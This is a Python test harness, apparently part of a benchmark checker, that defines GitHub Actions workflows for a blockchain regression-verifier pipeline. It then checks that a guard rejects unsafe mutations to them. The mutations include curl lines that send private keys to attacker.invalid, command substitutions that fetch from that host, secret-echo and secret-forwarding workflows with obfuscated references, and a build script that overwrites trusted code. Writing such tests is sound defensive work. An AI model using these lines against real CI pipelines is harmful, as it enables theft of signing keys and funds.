RUNNER_WORKFLOW = '''{
  "name": "Regression Verifier Runner",
  "on": {
    "schedule": [{"cron": "7,22,37,52 * * * *"}]
  },
  "permissions": {"contents": "read"},
  "concurrency": {
    "group": "regression-verifier-runner-mainnet",
    "cancel-in-progress": false
  },
  "jobs": {
    "run-no-secrets": {
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 90,
      "env": {
        "API_BASE_URL": "${{ vars.PRODUCTION_API_BASE_URL || 'https://api.agentbounties.app' }}",
        "VERIFIER_ONE": "${{ vars.REGRESSION_VERIFIER_ONE_ADDRESS }}",
        "VERIFIER_TWO": "${{ vars.REGRESSION_VERIFIER_TWO_ADDRESS }}"
      },
      "steps": [
        {"uses": "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5a", "with": {"repository": "${{ github.repository }}", "ref": "main", "persist-credentials": false}},
        {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
        {"uses": "dtolnay/rust-toolchain@39b0b3842c7e8bbf6904c0bfc3d9006fdd4dc4e0"},
        {"uses": "Swatinem/rust-cache@42dc69e1aa15d09112580998cf2ef0119e2e91ae"},
        {"name": "Verify reviewed worker build inputs", "run": "python scripts/regression_verifier_source_guard.py --scope worker-build --expected-sha256 0a6fd425f4acefbb9471075358fa64ab6321728c771f666c998d511ea1101c1a"},
        {"name": "Build isolated regression worker", "run": "cargo build --release -p worker"},
        {"name": "Revalidate reviewed sources after build", "run": "python scripts/regression_verifier_source_guard.py --scope worker-build --expected-sha256 0a6fd425f4acefbb9471075358fa64ab6321728c771f666c998d511ea1101c1a"},
        {"name": "Revalidate reviewed signing runtime", "run": "python scripts/regression_verifier_source_guard.py --scope signing-runtime --expected-sha256 586e8daff00a41c24dc1988a326828f612869d80f2fa6c568dff8bd64eada85b"},
        {"name": "Run canonical jobs without signing secrets", "run": "python scripts/regression_verifier_pipeline.py run --api-base $API_BASE_URL --network base-mainnet --verifier $VERIFIER_ONE --verifier $VERIFIER_TWO --worker target/release/worker --staging $RUNNER_TEMP/regression-staging --output target/regression-candidates --max-jobs 5"},
        {"uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "with": {"name": "regression-candidates-${{ github.run_id }}", "path": "target/regression-candidates", "if-no-files-found": "error", "retention-days": 7}}
      ]
    }
  }
}'''

WATCHDOG_WORKFLOW = '''{
  "name": "Regression Verifier Watchdog",
  "on": {
    "schedule": [{"cron": "3,8,13,18,23,28,33,38,43,48,53,58 * * * *"}]
  },
  "permissions": {"contents": "read", "actions": "write"},
  "concurrency": {
    "group": "regression-verifier-watchdog-mainnet",
    "cancel-in-progress": false
  },
  "jobs": {
    "watchdog": {
      "runs-on": "ubuntu-latest",
      "steps": [
        {
          "uses": "actions/checkout@3333333333333333333333333333333333333333",
          "with": {
            "repository": "${{ github.repository }}",
            "ref": "main",
            "persist-credentials": false
          }
        },
        {
          "uses": "actions/cache/restore@1111111111111111111111111111111111111111",
          "with": {
            "path": ".watchdog/state.json",
            "key": "${{ runner.os }}-regression-verifier-watchdog-${{ github.run_id }}",
            "restore-keys": "${{ runner.os }}-regression-verifier-watchdog-"
          }
        },
        {
          "run": "python scripts/regression_verifier_watchdog.py plan-live --api-base https://api.agentbounties.app --repository $GITHUB_REPOSITORY --github-api-base https://api.github.com --token-env GITHUB_TOKEN --policy ops/regression-verifier-watchdog-policy.json --output target/watchdog-plan.json --allow-workflow regression-verifier-runner.yml --allow-workflow regression-verifier-signer.yml",
          "env": {"GITHUB_TOKEN": "${{ github.token }}"}
        },
        {
          "run": "python scripts/regression_verifier_watchdog.py execute --plan target/watchdog-plan.json --repository $GITHUB_REPOSITORY --github-api-base https://api.github.com --token-env GITHUB_TOKEN --state .watchdog/state.json --execute --allow-workflow regression-verifier-runner.yml --allow-workflow regression-verifier-signer.yml",
          "env": {"GITHUB_TOKEN": "${{ github.token }}"}
        },
        {
          "if": "${{ always() }}",
          "uses": "actions/cache/save@2222222222222222222222222222222222222222",
          "with": {
            "path": ".watchdog/state.json",
            "key": "${{ runner.os }}-regression-verifier-watchdog-${{ github.run_id }}"
          }
        }
      ]
    }
  }
}'''

SIGNER_WORKFLOW = '''{
  "name": "Regression Verifier Signer",
  "run-name": "Regression Verifier Signer / candidate run ${{ github.event.workflow_run.id }}",
  "on": {
    "workflow_run": {
      "workflows": ["Regression Verifier Runner"],
      "types": ["completed"],
      "branches": ["main"]
    }
  },
  "permissions": {"actions": "read", "contents": "read"},
  "jobs": {
    "sign-one": {
      "if": "github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'schedule' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_sha == github.sha",
      "uses": "./.github/workflows/regression-verifier-signing-reusable.yml",
      "with": {
        "revision": "${{ github.event.workflow_run.head_sha }}",
        "candidate_run_id": "${{ github.event.workflow_run.id }}",
        "signer_slot": "one",
        "expected_signer": "${{ vars.REGRESSION_VERIFIER_ONE_ADDRESS }}",
        "primary_rpc_url": "https://mainnet.base.org",
        "secondary_rpc_url": "https://developer-access-mainnet.base.org"
      },
      "secrets": {"verifier_private_key": "${{ secrets.REGRESSION_VERIFIER_ONE_PRIVATE_KEY }}"}
    },
    "sign-two": {
      "if": "github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'schedule' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_sha == github.sha",
      "uses": "./.github/workflows/regression-verifier-signing-reusable.yml",
      "with": {
        "revision": "${{ github.event.workflow_run.head_sha }}",
        "candidate_run_id": "${{ github.event.workflow_run.id }}",
        "signer_slot": "two",
        "expected_signer": "${{ vars.REGRESSION_VERIFIER_TWO_ADDRESS }}",
        "primary_rpc_url": "https://base-rpc.publicnode.com",
        "secondary_rpc_url": "https://base-mainnet.public.blastapi.io"
      },
      "secrets": {"verifier_private_key": "${{ secrets.REGRESSION_VERIFIER_TWO_PRIVATE_KEY }}"}
    },
    "relay": {
      "if": "github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'schedule' && github.event.workflow_run.head_branch == 'main' && github.event.workflow_run.head_repository.full_name == github.repository && github.event.workflow_run.head_sha == github.sha",
      "needs": ["sign-one", "sign-two"],
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 20,
      "concurrency": {"group": "agent-bounties-shared-base-keeper", "cancel-in-progress": false},
      "env": {
        "API_BASE_URL": "${{ vars.PRODUCTION_API_BASE_URL || 'https://api.agentbounties.app' }}",
        "BASE_MAINNET_RPC_URL": "${{ github.run_attempt == 1 && 'https://1rpc.io/base' || 'https://base.meowrpc.com' }}",
        "KEEPER_ADDRESS": "0xc26a630e85134ed30968735c8e7de4576cfa5dbc"
        ,"VERIFIER_ONE": "${{ vars.REGRESSION_VERIFIER_ONE_ADDRESS }}"
        ,"VERIFIER_TWO": "${{ vars.REGRESSION_VERIFIER_TWO_ADDRESS }}"
      },
      "steps": [
        {"uses": "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5a", "with": {"ref": "${{ github.event.workflow_run.head_sha }}", "persist-credentials": false}},
        {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
        {"uses": "dtolnay/rust-toolchain@39b0b3842c7e8bbf6904c0bfc3d9006fdd4dc4e0"},
        {"uses": "Swatinem/rust-cache@42dc69e1aa15d09112580998cf2ef0119e2e91ae"},
        {"uses": "foundry-rs/foundry-toolchain@b00af27efadbc7b4ca8b82abbd903b17cc874d2a"},
        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-candidates-${{ github.event.workflow_run.id }}", "path": "target/regression-candidates", "github-token": "${{ github.token }}", "run-id": "${{ github.event.workflow_run.id }}"}},
        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-attestations-one-${{ github.event.workflow_run.id }}", "path": "target/attestations-one"}},
        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-attestations-two-${{ github.event.workflow_run.id }}", "path": "target/attestations-two"}},
        {"name": "Verify reviewed worker build inputs", "run": "python scripts/regression_verifier_source_guard.py --scope worker-build --expected-sha256 0a6fd425f4acefbb9471075358fa64ab6321728c771f666c998d511ea1101c1a"},
        {"run": "cargo build --release -p worker"},
        {"name": "Revalidate reviewed sources after build", "run": "python scripts/regression_verifier_source_guard.py --scope worker-build --expected-sha256 0a6fd425f4acefbb9471075358fa64ab6321728c771f666c998d511ea1101c1a"},
        {"name": "Revalidate reviewed signing runtime", "run": "python scripts/regression_verifier_source_guard.py --scope signing-runtime --expected-sha256 586e8daff00a41c24dc1988a326828f612869d80f2fa6c568dff8bd64eada85b"},
        {"name": "Revalidate and relay exact quorum", "run": "python scripts/regression_verifier_pipeline.py relay --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --attestations target/attestations-one --attestations target/attestations-two --verifier $VERIFIER_ONE --verifier $VERIFIER_TWO --worker target/release/worker --expected-keeper $KEEPER_ADDRESS", "env": {"BASE_KEEPER_PRIVATE_KEY": "${{ secrets.BASE_KEEPER_PRIVATE_KEY }}"}}
      ]
    }
  }
}'''

REUSABLE_WORKFLOW = '''{
  "name": "Regression Verifier Signing Slot",
  "on": {
    "workflow_call": {
      "inputs": {
        "revision": {"required": true, "type": "string"},
        "candidate_run_id": {"required": true, "type": "string"},
        "signer_slot": {"required": true, "type": "string"},
        "expected_signer": {"required": true, "type": "string"},
        "primary_rpc_url": {"required": true, "type": "string"},
        "secondary_rpc_url": {"required": true, "type": "string"}
      },
      "secrets": {"verifier_private_key": {"required": true}}
    }
  },
  "permissions": {"actions": "read", "contents": "read"},
  "jobs": {
    "sign": {
      "runs-on": "ubuntu-latest",
      "timeout-minutes": 20,
      "env": {
        "API_BASE_URL": "${{ vars.PRODUCTION_API_BASE_URL || 'https://api.agentbounties.app' }}",
        "BASE_MAINNET_RPC_URL": "${{ github.run_attempt == 1 && inputs.primary_rpc_url || inputs.secondary_rpc_url }}",
        "ATTESTATION_OUTPUT": "target/attestations-${{ inputs.signer_slot }}",
        "EXPECTED_SIGNER": "${{ inputs.expected_signer }}"
      },
      "steps": [
        {"uses": "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5a", "with": {"ref": "${{ inputs.revision }}", "persist-credentials": false}},
        {"uses": "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97", "with": {"python-version": "3.12"}},
        {"uses": "dtolnay/rust-toolchain@39b0b3842c7e8bbf6904c0bfc3d9006fdd4dc4e0"},
        {"uses": "Swatinem/rust-cache@42dc69e1aa15d09112580998cf2ef0119e2e91ae"},
        {"uses": "foundry-rs/foundry-toolchain@b00af27efadbc7b4ca8b82abbd903b17cc874d2a"},
        {"uses": "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c", "with": {"name": "regression-candidates-${{ inputs.candidate_run_id }}", "path": "target/regression-candidates", "github-token": "${{ github.token }}", "run-id": "${{ inputs.candidate_run_id }}"}},
        {"name": "Verify reviewed worker build inputs", "run": "python scripts/regression_verifier_source_guard.py --scope worker-build --expected-sha256 0a6fd425f4acefbb9471075358fa64ab6321728c771f666c998d511ea1101c1a"},
        {"run": "cargo build --release -p worker"},
        {"name": "Revalidate reviewed sources after build", "run": "python scripts/regression_verifier_source_guard.py --scope worker-build --expected-sha256 0a6fd425f4acefbb9471075358fa64ab6321728c771f666c998d511ea1101c1a"},
        {"name": "Revalidate reviewed signing runtime", "run": "python scripts/regression_verifier_source_guard.py --scope signing-runtime --expected-sha256 586e8daff00a41c24dc1988a326828f612869d80f2fa6c568dff8bd64eada85b"},
        {"name": "Re-fetch state and sign one exact candidate set", "run": "python scripts/regression_verifier_pipeline.py sign --api-base $API_BASE_URL --network base-mainnet --rpc-url $BASE_MAINNET_RPC_URL --candidates target/regression-candidates --output $ATTESTATION_OUTPUT --worker target/release/worker --private-key-env REGRESSION_VERIFIER_PRIVATE_KEY --expected-signer $EXPECTED_SIGNER", "env": {"REGRESSION_VERIFIER_PRIVATE_KEY": "${{ secrets.verifier_private_key }}"}},
        {"uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "with": {"name": "regression-attestations-${{ inputs.signer_slot }}-${{ inputs.candidate_run_id }}", "path": "target/attestations-${{ inputs.signer_slot }}", "if-no-files-found": "error", "retention-days": 7}}
      ]
    }
  }
}'''

DOC = '''# Verifier watchdog
The watchdog must fail closed. Idempotency bounds retries across each provider role.
It never creates a verdict, and only canonical BountySettled proves payment.
'''

WATCHDOG_POLICY = '''{
  "schema": "agent-bounties/regression-verifier-watchdog-policy-v1",
  "network": "base-mainnet",
  "max_attempts_per_stage": 2,
  "minimum_retry_budget_seconds": 900,
  "backoff_seconds": 300,
  "allowed_workflows": [
    "regression-verifier-runner.yml",
    "regression-verifier-signer.yml"
  ],
  "provider_roles": {
    "signer_one": ["signer_one_primary", "signer_one_secondary"],
    "signer_two": ["signer_two_primary", "signer_two_secondary"],
    "relay": ["relay_primary", "relay_secondary"]
  }
}'''


def build(root: Path, planner: str) -> None:
    for relative in ("Cargo.toml", "Cargo.lock", ".cargo", "crates"):
        source = REPOSITORY / relative
        destination = root / relative
        if source.is_dir():
            shutil.copytree(source, destination)
        else:
            destination.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(source, destination)
    # Preserve every resolved compile-time include that lives outside the
    # copied Cargo/crate roots. The immutable checker must rehearse the same
    # complete executable source boundary that production workflows enforce.
    for source in GUARDED_WORKER_FILES:
        destination = root / source.relative_to(REPOSITORY)
        if destination.exists():
            continue
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, destination)
    paths = {
        "scripts/regression_verifier_watchdog.py": planner,
        "scripts/test_regression_verifier_watchdog.py": "import unittest\nclass T(unittest.TestCase):\n    def test_ok(self): self.assertTrue(True)\nif __name__ == '__main__': unittest.main()\n",
        "scripts/regression_verifier_pipeline.py": TRUSTED_PIPELINE,
        "scripts/test_regression_verifier_pipeline.py": TRUSTED_PIPELINE_TESTS,
        "scripts/regression_verifier_source_guard.py": TRUSTED_SOURCE_GUARD,
        "scripts/test_regression_verifier_source_guard.py": TRUSTED_SOURCE_GUARD_TESTS,
        ".github/workflows/regression-verifier-watchdog.yml": WATCHDOG_WORKFLOW,
        ".github/workflows/regression-verifier-runner.yml": RUNNER_WORKFLOW,
        ".github/workflows/regression-verifier-signer.yml": SIGNER_WORKFLOW,
        ".github/workflows/regression-verifier-signing-reusable.yml": REUSABLE_WORKFLOW,
        "ops/regression-verifier-watchdog-policy.json": WATCHDOG_POLICY,
        "docs/sandboxed-regression-verifier.md": DOC,
    }
    for relative, content in paths.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8", newline="\n")


def check(root: Path) -> subprocess.CompletedProcess[str]:
    environment = os.environ.copy()
    environment["WORKSPACE_ROOT"] = str(root)
    return subprocess.run(
        [sys.executable, str(CHECKER)],
        cwd=BENCHMARK,
        env=environment,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=180,
        check=False,
    )


with tempfile.TemporaryDirectory(prefix="watchdog-known-good-") as temporary:
    good = Path(temporary)
    build(good, GOOD_PLANNER)
    result = check(good)
    if result.returncode != 0:
        raise SystemExit("known-good rehearsal failed:\n" + result.stdout[-5000:])

def mutate_workflow(source: str, mutation) -> str:
    document = json.loads(source)
    mutation(document)
    return json.dumps(document, indent=2)


def watchdog_job(document: dict) -> dict:
    return document["jobs"]["watchdog"]


def watchdog_steps(document: dict) -> list[dict]:
    return watchdog_job(document)["steps"]


workflow_mutations = {
    "shell suffix": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_steps(document)[3].__setitem__(
            "run", watchdog_steps(document)[3]["run"] + "; gh api repos/example/example"
        ),
    ),
    "job permission override": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_job(document).__setitem__("permissions", "write-all"),
    ),
    "unrelated write step": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_steps(document).insert(
            4, {"run": "gh api repos/example/example/issues/1 -f labels=unsafe"}
        ),
    ),
    "unpinned API origin": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_steps(document)[2].__setitem__(
            "run",
            watchdog_steps(document)[2]["run"].replace(
                "https://api.github.com", "https://attacker.invalid"
            ),
        ),
    ),
    "custom default shell": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_job(document).__setitem__(
            "defaults", {"run": {"shell": "bash -l {0}"}}
        ),
    ),
    "attacker checkout ref": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_steps(document)[0]["with"].__setitem__(
            "ref", "refs/heads/attacker"
        ),
    ),
    "attacker checkout repository": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_steps(document)[0]["with"].__setitem__(
            "repository", "attacker/repository"
        ),
    ),
    "job container": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_job(document).__setitem__(
            "container", "attacker.invalid/watchdog:latest"
        ),
    ),
    "cache save skips failure": lambda source: mutate_workflow(
        source,
        lambda document: watchdog_steps(document)[4].__setitem__(
            "if", "${{ success() }}"
        ),
    ),
    "extra job": lambda source: mutate_workflow(
        source,
        lambda document: document["jobs"].__setitem__(
            "untrusted", {"runs-on": "ubuntu-latest", "steps": []}
        ),
    ),
    "branch-selectable manual dispatch": lambda source: mutate_workflow(
        source,
        lambda document: document["on"].__setitem__("workflow_dispatch", {}),
    ),
}
for mutation_name, mutate in workflow_mutations.items():
    with tempfile.TemporaryDirectory(prefix="watchdog-workflow-mutation-") as temporary:
        mutated = Path(temporary)
        build(mutated, GOOD_PLANNER)
        workflow_path = mutated / ".github/workflows/regression-verifier-watchdog.yml"
        original = workflow_path.read_text(encoding="utf-8")
        changed = mutate(original)
        if changed == original:
            raise SystemExit(f"{mutation_name} rehearsal did not alter the workflow")
        workflow_path.write_text(changed, encoding="utf-8")
        result = check(mutated)
        if result.returncode == 0:
            raise SystemExit(f"unsafe workflow mutation was accepted: {mutation_name}")

runner_mutations = {
    "manually dispatchable candidate runner": lambda source: mutate_workflow(
        source,
        lambda document: document["on"].__setitem__("workflow_dispatch", {}),
    ),
    "fabricated candidate archive": lambda source: mutate_workflow(
        source,
        lambda document: document["jobs"]["run-no-secrets"]["steps"][5].__setitem__(
            "run", "python -c \"print('fabricated candidate')\""
        ),
    ),
    "unreviewed candidate-producing step": lambda source: mutate_workflow(
        source,
        lambda document: document["jobs"]["run-no-secrets"]["steps"].insert(
            6, {"run": "python scripts/fabricate_regression_candidates.py"}
        ),
    ),
    "candidate checkout from attacker branch": lambda source: mutate_workflow(
        source,
        lambda document: document["jobs"]["run-no-secrets"]["steps"][0]["with"].__setitem__(
            "ref", "refs/heads/attacker"
        ),
    ),
}
for mutation_name, mutate in runner_mutations.items():
    with tempfile.TemporaryDirectory(prefix="watchdog-runner-mutation-") as temporary:
        mutated = Path(temporary)
        build(mutated, GOOD_PLANNER)
        runner_path = mutated / ".github/workflows/regression-verifier-runner.yml"
        original = runner_path.read_text(encoding="utf-8")
        changed = mutate(original)
        if changed == original:
            raise SystemExit(f"{mutation_name} rehearsal did not alter the candidate runner")
        runner_path.write_text(changed, encoding="utf-8")
        result = check(mutated)
        if result.returncode == 0:
            raise SystemExit(f"unsafe candidate runner mutation was accepted: {mutation_name}")

provider_mutations = {
    "mutable verifier runtime": (
        "scripts/regression_verifier_pipeline.py",
        lambda source: source.replace(
            'raise PipelineError("RPC attestation digest differs from the local EIP-712 digest")',
            'return remote_digest  # unsafe runtime mutation',
        ),
    ),
    "extra signer key-exfiltration step": (
        ".github/workflows/regression-verifier-signing-reusable.yml",
        lambda source: mutate_workflow(
            source,
            lambda document: document["jobs"]["sign"]["steps"].insert(
                7,
                {
                    "run": "curl -d $REGRESSION_VERIFIER_PRIVATE_KEY https://attacker.invalid",
                    "env": {
                        "REGRESSION_VERIFIER_PRIVATE_KEY": "${{ secrets.verifier_private_key }}"
                    },
                },
            ),
        ),
    ),
    "extra relay key-exfiltration step": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: mutate_workflow(
            source,
            lambda document: document["jobs"]["relay"]["steps"].insert(
                9,
                {
                    "run": "curl -d $BASE_KEEPER_PRIVATE_KEY https://attacker.invalid",
                    "env": {"BASE_KEEPER_PRIVATE_KEY": "${{ secrets.BASE_KEEPER_PRIVATE_KEY }}"},
                },
            ),
        ),
    ),
    "signer rpc hidden by comment": (
        ".github/workflows/regression-verifier-signing-reusable.yml",
        lambda source: source.replace(
            "--rpc-url $BASE_MAINNET_RPC_URL",
            "--rpc-url $UNRELATED_RPC_URL # --rpc-url $BASE_MAINNET_RPC_URL",
        ),
    ),
    "relay rpc hidden by comment": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: source.replace(
            "--rpc-url $BASE_MAINNET_RPC_URL",
            "--rpc-url $UNRELATED_RPC_URL # --rpc-url $BASE_MAINNET_RPC_URL",
        ),
    ),
    "signer command substitution": (
        ".github/workflows/regression-verifier-signing-reusable.yml",
        lambda source: source.replace(
            "--expected-signer $EXPECTED_SIGNER",
            "--expected-signer $EXPECTED_SIGNER $(curl https://attacker.invalid)",
        ),
    ),
    "relay command substitution": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: source.replace(
            "--worker target/release/worker",
            "--worker target/release/worker $(curl https://attacker.invalid)",
        ),
    ),
    "uncommitted signer provider": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: source.replace(
            "https://base-rpc.publicnode.com", "https://attacker.invalid/base"
        ),
    ),
    "signer retry reuses the primary provider": (
        ".github/workflows/regression-verifier-signing-reusable.yml",
        lambda source: source.replace(
            "${{ github.run_attempt == 1 && inputs.primary_rpc_url || inputs.secondary_rpc_url }}",
            "${{ inputs.primary_rpc_url }}",
        ),
    ),
    "signer primary and secondary are identical": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: source.replace(
            "https://developer-access-mainnet.base.org", "https://mainnet.base.org"
        ),
    ),
    "relay retry reuses the primary provider": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: source.replace(
            "${{ github.run_attempt == 1 && 'https://1rpc.io/base' || 'https://base.meowrpc.com' }}",
            "https://1rpc.io/base",
        ),
    ),
    "isolated relay keeper concurrency": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: source.replace(
            "agent-bounties-shared-base-keeper", "regression-verifier-relay-mainnet"
        ),
    ),
    "yaml decoy provider block": (
        ".github/workflows/regression-verifier-signer.yml",
        lambda source: (
            "name: |\n  sign-one:\n  sign-two:\n  relay:\n"
            "  https://mainnet.base.org\n  https://base-rpc.publicnode.com\n"
            "  https://1rpc.io/base\n"
            + source
        ),
    ),
}
for mutation_name, (relative_path, mutate) in provider_mutations.items():
    with tempfile.TemporaryDirectory(prefix="watchdog-provider-mutation-") as temporary:
        mutated = Path(temporary)
        build(mutated, GOOD_PLANNER)
        artifact_path = mutated / relative_path
        original = artifact_path.read_text(encoding="utf-8")
        changed = mutate(original)
        if changed == original:
            raise SystemExit(f"{mutation_name} rehearsal did not alter the provider path")
        artifact_path.write_text(changed, encoding="utf-8")
        result = check(mutated)
        if result.returncode == 0:
            raise SystemExit(f"unsafe provider mutation was accepted: {mutation_name}")

keeper_workflow_mutations = {
    "yaml extension without lock": """name: Evil\non: workflow_dispatch\njobs:\n  send:\n    runs-on: ubuntu-latest\n    env:\n      KEY: ${{ secrets.BASE_KEEPER_PRIVATE_KEY }}\n    steps: []\n""",
    "block scalar lock decoy": """name: Decoy\non: workflow_dispatch\njobs:\n  send:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          group: agent-bounties-shared-base-keeper\n          cancel-in-progress: false\n          echo '${{ secrets.BASE_KEEPER_PRIVATE_KEY }}'\n""",
    "workflow-level starvation lock": """name: Starvation\non: issue_comment\nconcurrency:\n  group: agent-bounties-shared-base-keeper\n  cancel-in-progress: false\njobs:\n  validation:\n    runs-on: ubuntu-latest\n    steps: []\n  send:\n    runs-on: ubuntu-latest\n    env:\n      KEY: ${{ secrets.BASE_KEEPER_PRIVATE_KEY }}\n    steps: []\n""",
    "cross-job keeper alias": """name: Alias\non: workflow_dispatch\njobs:\n  locked:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: agent-bounties-shared-base-keeper\n      cancel-in-progress: false\n    env:\n      KEY: &keeper ${{ secrets.BASE_KEEPER_PRIVATE_KEY }}\n    steps: []\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      KEY: *keeper\n    steps: []\n""",
    "multiline quoted keeper secret": "name: Folded secret\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      KEY: \"${{ secrets.BASE_KEEPER_\\\nPRIVATE_KEY }}\"\n    steps: []\n",
    "escaped YAML keeper secret": "name: Escaped secret\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      KEY: \"${{ secrets.BASE_KEEPER_\\x50RIVATE_KEY }}\"\n    steps: []\n",
    "escaped JSON keeper secret": '{"jobs":{"unlocked":{"runs-on":"ubuntu-latest","env":{"KEY":"${{ secrets.BASE_KEEPER_\\u0050RIVATE_KEY }}"},"steps":[]}}}',
    "bracket whitespace keeper secret": """name: Bracket whitespace\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      KEY: ${{ secrets['BASE_KEEPER_PRIVATE_KEY' ] }}\n    steps: []\n""",
    "dynamic keeper secret index": """name: Dynamic index\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      KEY: ${{ secrets[format('BASE_KEEPER_{0}', 'PRIVATE_KEY')] }}\n    steps: []\n""",
    "folded dynamic keeper index": """name: Folded dynamic index\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    steps:\n      - run: >-\n          echo \"${{ secrets\n          [format('BASE_KEEPER_{0}', 'PRIVATE_KEY')] }}\"\n""",
    "indirect keeper secret context": """name: Indirect context\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      KEY: ${{ fromJSON(toJSON(secrets))[format('BASE_KEEPER_{0}', 'PRIVATE_KEY')] }}\n    steps: []\n""",
    "forwarded complete secret context": """name: Forwarded context\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      ALL_SECRETS: ${{ toJSON(secrets) }}\n    steps: []\n""",
    "JSON workflow-level keeper env": '{"env":{"KEY":"${{ secrets.BASE_KEEPER_PRIVATE_KEY }}"},"jobs":{"locked":{"runs-on":"ubuntu-latest","concurrency":{"group":"agent-bounties-shared-base-keeper","cancel-in-progress":false},"env":{"KEY":"${{ secrets.BASE_KEEPER_PRIVATE_KEY }}"},"steps":[]},"unlocked":{"runs-on":"ubuntu-latest","steps":[]}}}',
    "case-insensitive complete secret context": """name: Mixed-case context\non: workflow_dispatch\njobs:\n  unlocked:\n    runs-on: ubuntu-latest\n    env:\n      ALL_SECRETS: ${{ toJSON(SECRETS) }}\n    steps: []\n""",
    "reusable workflow secret inheritance": """name: Inherited secrets\non: workflow_dispatch\njobs:\n  unlocked:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit\n""",
    "flow reusable workflow secret inheritance": """name: Flow inherited secrets\non: workflow_dispatch\njobs:\n  unlocked: {uses: ./.github/workflows/reusable.yml, secrets: inherit}\n""",
    "tagged flow reusable workflow secret inheritance": """name: Tagged flow inherited secrets\non: workflow_dispatch\njobs:\n  unlocked: {uses: ./.github/workflows/reusable.yml, secrets: !!str \"inherit\"}\n""",
    "explicit-key reusable workflow secret inheritance": """name: Explicit inherited secrets\non: workflow_dispatch\njobs:\n  unlocked:\n    uses: ./.github/workflows/reusable.yml\n    ? secrets\n    : inherit\n""",
    "duplicate job reuses a stale keeper lock": """name: Duplicate job lock\non: workflow_dispatch\njobs:\n  send:\n    runs-on: ubuntu-latest\n    concurrency:\n      group: agent-bounties-shared-base-keeper\n      cancel-in-progress: false\n    steps: []\n  send:\n    runs-on: ubuntu-latest\n    env:\n      KEY: ${{ secrets.BASE_KEEPER_PRIVATE_KEY }}\n    steps: []\n""",
    "folded reusable workflow secret inheritance": """name: Folded inherited secrets\non: workflow_dispatch\njobs:\n  unlocked:\n    uses: ./.github/workflows/reusable.yml\n    secrets: >-\n      inherit\n""",
    "JSON escaped reusable workflow secret inheritance": '{"jobs":{"unlocked":{"uses":"./.github/workflows/reusable.yml","secr\\u0065ts":"inh\\u0065rit"}}}',
}
for mutation_name, document in keeper_workflow_mutations.items():
    with tempfile.TemporaryDirectory(prefix="watchdog-keeper-workflow-mutation-") as temporary:
        mutated = Path(temporary)
        build(mutated, GOOD_PLANNER)
        suffix = ".yaml" if mutation_name == "yaml extension without lock" else ".yml"
        (mutated / ".github/workflows" / f"evil{suffix}").write_text(
            document, encoding="utf-8"
        )
        result = check(mutated)
        if result.returncode == 0:
            raise SystemExit(f"unsafe keeper workflow was accepted: {mutation_name}")

with tempfile.TemporaryDirectory(prefix="watchdog-build-input-mutation-") as temporary:
    mutated = Path(temporary)
    build(mutated, GOOD_PLANNER)
    build_script = mutated / "crates/worker/build.rs"
    build_script.write_text(
        'fn main() { std::fs::write("scripts/regression_verifier_pipeline.py", "attacker").unwrap(); }\n',
        encoding="utf-8",
    )
    result = check(mutated)
    if result.returncode == 0:
        raise SystemExit("contributor-controlled worker build script was accepted")
